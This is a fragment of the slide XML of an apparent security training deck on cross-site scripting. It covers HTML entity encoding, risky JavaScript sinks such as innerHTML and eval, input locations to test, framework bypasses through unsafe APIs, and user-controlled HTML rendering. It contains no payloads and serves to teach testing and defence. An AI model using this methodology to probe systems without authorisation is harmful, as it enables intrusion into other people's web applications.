          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="7523163" y="2795588"/>
          <a:ext cx="3759200" cy="1828800"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:tableStyleId>{21E4AEA4-8DFA-4A89-87EB-49C32662AFE0}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1879600">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4021408184"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1879600">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2676586111"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Character</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Encoded Version</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2763787478"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>&lt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>&amp;lt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1542902621"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>&amp;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>gt</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1670641776"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>"</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>&amp;quot;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="619367371"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>'</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>&amp;#39;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3261639870"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1280665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6934E3-0A2B-8953-0B26-90057EB5EEB6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Review client-side scripts for risky patterns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Common examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>outerHTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.write</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eval</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>new Function</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setTimeout</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setInterval</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If user input reaches these functions, further investigation may be warranted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B15077DE-F6B1-CA80-1C2D-C54955B24209}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Inspect JavaScript Files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{460E0596-7FBB-D24F-556F-2E8D8C91DBAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>34</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2148792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B23055-FDD4-61DB-6A6E-DFD409BD6C6A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS isn't limited to visible form fields.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Consider examining:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>URL Parameters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>page?id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=123</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP Headers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User-Agent</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Host</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>X-Forwarded-For</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cookies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cookie: theme=dark</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>JSON Parameters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>{</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>name":"test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Multipart Requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>File uploads and metadata fields may also affect rendering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{194F4279-69E5-CE10-E202-81FD6F546C19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Test Different Input Locations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4708DF3A-45A9-CB57-FEB9-004CA46A4892}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>35</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39152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BBBE4A-2D69-24E4-81A1-91F846BD72DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Modern frameworks often provide protection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Angular </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Vue.js </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>However, protections can be bypassed when developers use unsafe APIs that intentionally disable escaping.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3640FC0-38D7-31BF-4102-9E2D577ED04F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Analyze Client-Side Framework Usage</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E13726F-F056-C4D2-C35E-6042411F2139}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>36</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22806454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74388D-6B89-D3DE-AEB4-91E47D9CD262}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Features that intentionally allow formatting are higher risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rich text editors </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Markdown renderers </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Forum posts </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Product descriptions </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Blog comments </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Review how user-generated content is sanitized before rendering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F987AD7-DCEE-ECB7-7AA8-E6046F9081FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Look for User-Controlled HTML Rendering</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{361B5473-D85A-1730-6F1C-7E358E6B698A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>37</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1544785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2073</TotalTime>
  <Words>2302</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>382</Paragraphs>
  <Slides>37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Aptos</vt:lpstr>
      <vt:lpstr>Aptos Display</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Cross site Scripting</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>How XSS Works</vt:lpstr>
      <vt:lpstr>What can XSS cause?</vt:lpstr>
      <vt:lpstr>Types Of XSS </vt:lpstr>
      <vt:lpstr>Overview of XSS</vt:lpstr>
      <vt:lpstr>XSS - Stored  </vt:lpstr>
      <vt:lpstr>Example Scenario and Attack Flow</vt:lpstr>
      <vt:lpstr>Reflected Cross-Site Scripting (Reflected XSS)</vt:lpstr>
      <vt:lpstr>Real-World Attack Scenario </vt:lpstr>
      <vt:lpstr>Impact Of Reflected XSS</vt:lpstr>
      <vt:lpstr>DOM-Based XSS</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Why It is called DOM based XSS?</vt:lpstr>
      <vt:lpstr>DOM XSS Attack Flow</vt:lpstr>
      <vt:lpstr>Sources and Sinks</vt:lpstr>
      <vt:lpstr>Common Source and Sink inlcude: </vt:lpstr>
      <vt:lpstr>DOM XSS Prevention</vt:lpstr>
      <vt:lpstr>Stored, Reflected and DOM based XSS</vt:lpstr>
      <vt:lpstr>How to find and test for XSS vulnerabilities</vt:lpstr>
      <vt:lpstr>How to Find and Test for XSS Vulnerabilities</vt:lpstr>
      <vt:lpstr>XSS Testing Methodology</vt:lpstr>
      <vt:lpstr>Understand the Application</vt:lpstr>
      <vt:lpstr>Identify Reflection Points</vt:lpstr>
      <vt:lpstr>Determine the Context</vt:lpstr>
      <vt:lpstr>Test for Stored XSS</vt:lpstr>
      <vt:lpstr>Test for Reflected XSS</vt:lpstr>
      <vt:lpstr>Test for DOM-Based XSS</vt:lpstr>
      <vt:lpstr>Perform Source and Sink Analysis</vt:lpstr>
      <vt:lpstr>Examine Browser Developer Tools</vt:lpstr>
      <vt:lpstr>Check Input Filters and Encoding</vt:lpstr>
      <vt:lpstr>Inspect JavaScript Files</vt:lpstr>
      <vt:lpstr>Test Different Input Locations</vt:lpstr>
      <vt:lpstr>Analyze Client-Side Framework Usage</vt:lpstr>
      <vt:lpstr>Look for User-Controlled HTML Rendering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SOC ERT</dc:creator>
  <cp:lastModifiedBy>Training Common</cp:lastModifiedBy>
  <cp:revision>51</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-01-13T08:18:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-08T08:05:40Z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87BA96AD523942AE9835531C8F749A1B_13</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2057-12.2.0.23197</vt:lpwstr>
  </property>
</Properties>
</file>